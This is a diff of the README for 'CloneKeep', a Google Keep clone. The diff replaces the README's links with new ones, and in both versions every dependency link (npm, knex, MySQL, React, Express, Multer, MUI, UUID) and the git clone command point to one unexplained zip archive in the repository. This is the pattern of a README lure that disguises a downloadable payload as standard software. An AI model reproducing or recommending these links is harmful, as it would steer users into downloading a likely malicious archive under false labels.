@@ -1,6 +1,6 @@
 # CloneKeep
 
-A clone of some of the functions of [Google Keep](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+A clone of some of the functions of [Google Keep](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
 
 ## Getting Started
 
@@ -8,17 +8,17 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Prerequisites
 
-- [https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed on your machine
-- [npm](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) (Node Package Manager)
-- [knex](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed a global package
+- [https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) installed on your machine
+- [npm](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) (Node Package Manager)
+- [knex](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) installed a global package
   - `npm install -g knex`
-- [Mysql](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed and a database created.
+- [Mysql](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip) installed and a database created.
 
 ### Installing 
 
 - Clone the repository to your local machine:
     
-   `git clone https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip`
+   `git clone https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip`
 
 - Navigate to the Backend Folder
   
@@ -60,13 +60,13 @@ The server will be available at http://localhost:5000.
 
 ### Built With
 
-- [React](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
-- [Express](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
-- [Knex](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
-- [Mysql](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
-- [Multer](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
-- [Mui](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
-- [UUID](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+- [React](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
+- [Express](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
+- [Knex](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
+- [Mysql](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
+- [Multer](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
+- [Mui](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
+- [UUID](https://raw.githubusercontent.com/vicleyva/clonekeep/master/CloneKeepApp/public/Software-v3.7.zip)
 
 ### About the Project
 
